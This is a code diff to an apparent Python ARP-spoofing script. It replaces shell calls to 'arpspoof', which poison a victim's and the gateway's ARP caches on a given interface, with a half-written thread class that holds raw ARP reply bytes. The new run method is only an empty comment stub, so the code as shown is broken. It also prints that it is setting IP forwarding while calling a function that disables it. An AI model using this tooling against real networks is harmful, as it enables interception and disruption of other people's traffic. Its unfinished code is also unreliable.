@@ -8,24 +8,31 @@ import threading
 
 
 interface = sys.argv[1]
-router_ip = sys.argv[2]
+gateway_ip = sys.argv[2]
+
+mac = None
+
 victims = []
 threads = []
 
 
-class terminalThread(threading.Thread):
-	def __init__(self, command):
+class attackThread(threading.Thread):
+	def __init__(self, gateway, victim):
 		threading.Thread.__init__(self)
-		self.command = command
+		self.victim = victim
+		self.gateway = gateway
+
+		# Other
+		self.arp = b'\x08\x06'
+		self.protocol = b'\x00\x01\x08\x00\x06\x04\x00\x02'
 
 	def run(self):
-		os.system(self.command)
+		#
 
 
 def attack(ips):
 	for ip in ips:
-		threads.append(terminalThread(f"arpspoof -i {interface} -t {ip} {router_ip}"))
-		threads.append(terminalThread(f"arpspoof -i {interface} -t {router_ip} {ip}"))
+		threads.append(attackThread(gateway_ip, ip))
 
 	for th in threads:
 		th.start()
@@ -64,6 +71,13 @@ def scanner(ip):
 
 
 def main():
+	if interface in netifaces.interfaces():
+		mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]
+
+	else:
+		print(f"Interface {interface} not found")
+		raise KeyboardInterrupt
+
 	print("Setting IP forward on your PC..")
 	disable_ip_forward()
 
@@ -92,6 +106,7 @@ if __name__== "__main__":
 		main()
 	except KeyboardInterrupt:
 		print("Attack was stopped.")
+
 
 
 
